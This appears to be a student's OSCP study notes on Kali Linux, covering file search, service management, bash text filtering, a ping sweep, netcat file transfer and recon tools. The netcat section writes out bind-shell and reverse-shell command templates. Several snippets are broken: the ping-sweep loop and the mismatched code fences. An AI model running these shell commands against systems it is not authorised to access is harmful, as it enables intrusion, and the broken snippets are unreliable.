<p align="center;style="font-size:50px;color:red">

  SCP<br>

 <img src="oscp1.png">
</p>
<font>
  size="40"
  color="red"
</font>
<p><b> Getting Comfortable With Kali Linux</b><br></p>


# Find File:

**locate**
```
updatedb
```
to update the file index database

```
locate [filename]
```
**which**

find the file which has current execution environment

```
which [part of file name]
```

**find**

powerfull search tool with many arguments

```
find [search location]  -name [filename] -exec file "{}"\;
```

# Service managent:

```
service [service name] [option]

```
option could be : start, stop, or restart

alternatevly you can use:

```
/etc/init.d/[service name] [option]
```

or:

```
update-rc.d [service name] [options]

```

options here are: defaults, remove, start , or stop



**GUI service management:**

rcconf

![Alt text](rcconf.png)


sysv--rc-conf

![Alt text](sysv-rc-conf.png)


# Bash Shell

to automate actions you need to write some shell scripts for example filtring domain names from a html page:

``` 
wget cisco.com 
cat index.html | grep "a href=" | cut -d "/" -f3
```

if you get error *ERROR: The certificate of ‘www.cisco.com’ is not trusted.* just use *wget --no-check-certificate cisco.com*

other method:

``
cat index.html |grep 'http://[^"]*' | cut -d "/" -f 3 |sort -u
```

# direct error to null screen (do not show errors)

```
command 2>/dev/null

```
where:

stdin – 0 – Standard Input (usually keyboard or file)

stdout – 1 – Standard Output (usually screen)

stderr – 2 – Standard Error (usually screen)


# Reverse Hex Dump:

```
xxd -r file > output
```
# login with ssh-private key

```
ssh -i [key file path] user@host

```

# ping sweeper:

```
#! /bin/bash
```
for ip in $(1 255) do
ping 192.168.1.$ip | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 &
```

the & is to send each command to background and run the next on in the loop

# Rdisktop

```
rdisktop -u *username* -p *password* *hostname/ip*
```

# NetCat

on server side:

```
nc -nlp *port*
```
n stands for numerical host ( no DNS)
l stands for listen
p stands for port

on clinet side:

```
nc -n *netcat Server machine IP address* *port*
```

the port is the server spacified port number 


NetCat file transfare:

```
server side:
nc -npl *port* > *name for the recived file*

client side:
nc -n *serverIP* *serverport* < *path of the file to be send*
```
NetCat Remote Execution:

```
**forword command execution(Bind Shell)**
server side:
nc -lp *port* -e *full path of command to be executed*
clinet side:
nc -n *serverIP* *serverport*
**revirce shell**
server side:
nc -lp *port*
clinet side:
nc -n *serverIP* *serverPort* -e *full path of command to be executed*
```
# Reconnaissance:

Pasive:

```
theHarvester -d *domainname* -b google

```
you can use any other search engen to search in

```
whois *domainname* OR *IP*
```


DNS Enumeration:

``` 
host *internet hostname*
```

that would resolve the hostname to an IP address

```
host -t *DNS recired type* *domain*

recored type such as: ns, mx, a, and aaaa
```

Note -A insted of -t gets all the recoreds ns, mx, a, and aaaa recoreds